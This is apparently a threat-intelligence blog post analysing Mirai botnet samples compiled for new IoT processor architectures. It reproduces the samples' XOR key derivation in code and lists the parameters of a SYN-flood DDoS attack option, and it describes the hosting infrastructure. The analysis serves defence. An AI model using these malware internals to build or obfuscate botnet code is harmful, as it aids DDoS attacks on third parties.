Executive Summary
In late February 2019, Unit 42 discovered Mirai samples compiled for new processors/architectures not
previously seen before. Despite the source code being publicly released In October of 2016, the malware
has, until now, only been found targeting a fixed set of processors/architectures.
Unit 42 has found the newly discovered samples are compiled for Altera Nios II, OpenRISC, Tensilica
Xtensa, and Xilinx MicroBlaze processors. This is not the first time Mirai has been expanded for new
processor architectures, samples targeting ARC CPUs were discovered in January 2018. Yet this
development shows that Mirai developers continue to actively innovate, targeting a growing array of IoT
devices. The malware gained notoriety in 2016 for its use in massive denial of service attacks on Dyn and
the website of security blogger Brian Krebs. If the latest innovations lead to an increase in the number of
infected devices, that means that Mirai attackers would have access to additional firepower for use in denial
of service attacks.
In this blog, we show the new features we’ve found in these new samples, discuss the infrastructure we
observed, show how other Mirai samples using known exploits were hosted on the same infrastructure as
the new samples, and give indicators of compromise (IoCs) for these new samples.
To protect against Mirai and other threats, organizations should make securing their IoT devices with the
latest updates and non-default passwords a priority.

New Features in these New Samples
In addition to the being compiled for these new architectures, we have found that these new samples also
contain the following new features:
Encryption algorithm: These samples make use of a modified version of the standard byte-wise XOR
(as implemented in the toggle_obf function) used in the original Mirai source code.
It uses 11 8-byte keys, all of which are cumulatively byte-wise XOR-ed to get the final resulting key. This is
better illustrated in the code snippet below:

tablekeys = [0xdeadbeef, 0x85DAB8BF, 0xDEEDEEBF, 0xDEABBEAF, 0xDBBD45BF, 0x246584EF,
0x85BFE8BF, 0xD68395BF, 0xDBAAAAAF, 0x0DAABEEF]
xor_key = 0
for key in tablekeys:
xor_key ^= key&0xff ^ (key>>8 & 0xff) ^ (key>>16 & 0xfF) ^ (key>>24 & 0xff)

This is effectively the equivalent of a byte-wise XOR with 0x5A.
attack_method_ovh: The samples include a DDoS attack option with the following parameters:

ATK_OPT_IP_TOS = 0
ATK_OPT_IP_IDENT = 0xFFFF
ATK_OPT_IP_TTL = 64
ATK_OPT_IP_DF = 1
ATK_OPT_SPORT = 0xFFFF
ATK_OPT_DPORT = 0xFFFF
ATK_OPT_SEQRND = 0xFFFF
ATK_OPT_ACKRND = 0
ATK_OPT_URG = 0
ATK_OPT_ACK = 0
ATK_OPT_PSH = 0
ATK_OPT_RST = 0
ATK_OPT_SYN = 1
ATK_OPT_FIN = 0
ATK_OPT_SOURCE = LOCAL_ADDR

These are the exact same parameters as the attack method “TCP SYN” (attack_method_tcpsyn) in the
original Mirai source, so the reason behind incorporating a new attack method with the same parameters
remains unclear.
Pivoting on this attack method in AutoFocus, we found samples circulating in the wild since November
2018 for other previously known architectures also employing it.

Infrastructure
We found these latest samples on a single IP that at one point of time was hosting them via an open
directory; however, on February 22, 2019, the server was later updated to hide the file listing but continued
to host the files themselves.

Figure 1. Open directory hosting samples of the Mirai variant
Prior to the update on February 22, the same IP was hosting Mirai samples containing the following exploits
known to be used in previous versions of Mirai. The presence of these exploits in both previous versions of
Mirai and our newly discovered samples help show the tie between the two are likely used by the same
attacker in this case. These exploits are shown in Table 1, below.

Conclusion

5/8

Given that the Mirai source code is open source, something as elementary as compiling the same source
code for a larger range of processors provides attackers with the advantage of a larger attack surface.
Practically, this means that the family can now infect and propagate via a larger number of embedded
devices, affording attackers greater DDoS firepower.
